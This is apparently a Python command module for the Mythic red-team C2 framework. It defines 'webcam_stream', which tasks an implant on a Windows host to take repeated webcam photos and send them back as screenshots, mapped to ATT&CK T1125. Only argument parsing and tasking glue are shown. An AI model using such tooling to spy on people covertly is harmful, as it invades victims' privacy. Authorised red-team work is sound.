from mythic_container.MythicCommandBase import *


class WebcamStreamArguments(TaskArguments):

    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="duration",
                cli_name="duration",
                display_name="Duration (seconds)",
                type=ParameterType.Number,
                default_value=30,
                description="How long to stream webcam captures in seconds (1-3600).",
                parameter_group_info=[
                    ParameterGroupInfo(
                        required=True,
                        group_name="Default",
                        ui_position=1
                    )
                ]),
            CommandParameter(
                name="interval",
                cli_name="interval",
                display_name="Capture Interval (seconds)",
                type=ParameterType.Number,
                default_value=5,
                description="Seconds between each webcam capture (1-60).",
                parameter_group_info=[
                    ParameterGroupInfo(
                        required=False,
                        group_name="Default",
                        ui_position=2
                    )
                ]),
            CommandParameter(
                name="device_index",
                cli_name="device_index",
                display_name="Camera Device Index",
                type=ParameterType.Number,
                default_value=0,
                description="Index of the camera device to capture from (0 = first camera).",
                parameter_group_info=[
                    ParameterGroupInfo(
                        required=False,
                        group_name="Default",
                        ui_position=3
                    )
                ]),
        ]

    async def parse_arguments(self):
        if len(self.command_line.strip()) == 0:
            raise Exception("webcam_stream -duration <seconds> [-interval <seconds>] [-device_index <index>]")
        if self.command_line[0] == "{":
            self.load_args_from_json_string(self.command_line)
        else:
            parts = self.command_line.strip().split()
            if len(parts) >= 1:
                try:
                    self.add_arg("duration", int(parts[0]))
                except:
                    raise Exception("Invalid duration: {}".format(parts[0]))
            if len(parts) >= 2:
                try:
                    self.add_arg("interval", int(parts[1]))
                except:
                    raise Exception("Invalid interval: {}".format(parts[1]))
            if len(parts) >= 3:
                try:
                    self.add_arg("device_index", int(parts[2]))
                except:
                    raise Exception("Invalid device_index: {}".format(parts[2]))


class WebcamStreamCommand(CommandBase):
    cmd = "webcam_stream"
    needs_admin = False
    help_cmd = "webcam_stream <duration> [interval] [device_index]"
    description = "Stream webcam captures by taking photos at a regular interval for a specified duration. Each capture is sent back to Mythic as a screenshot. Similar to Meterpreter's webcam_stream."
    version = 1
    author = "@haha150"
    argument_class = WebcamStreamArguments
    attackmapping = ["T1125"]
    attributes = CommandAttributes(
        supported_os=[SupportedOS.Windows],
    )

    async def create_go_tasking(self, taskData: PTTaskMessageAllData) -> PTTaskCreateTaskingMessageResponse:
        response = PTTaskCreateTaskingMessageResponse(
            TaskID=taskData.Task.ID,
            Success=True,
        )
        duration = taskData.args.get_arg("duration")
        interval = taskData.args.get_arg("interval")
        device_index = taskData.args.get_arg("device_index")
        response.DisplayParams = "-Duration {} -Interval {} -DeviceIndex {}".format(duration, interval, device_index)
        return response

    async def process_response(self, task: PTTaskMessageAllData, response: any) -> PTTaskProcessResponseMessageResponse:
        resp = PTTaskProcessResponseMessageResponse(TaskID=task.Task.ID, Success=True)
        return resp
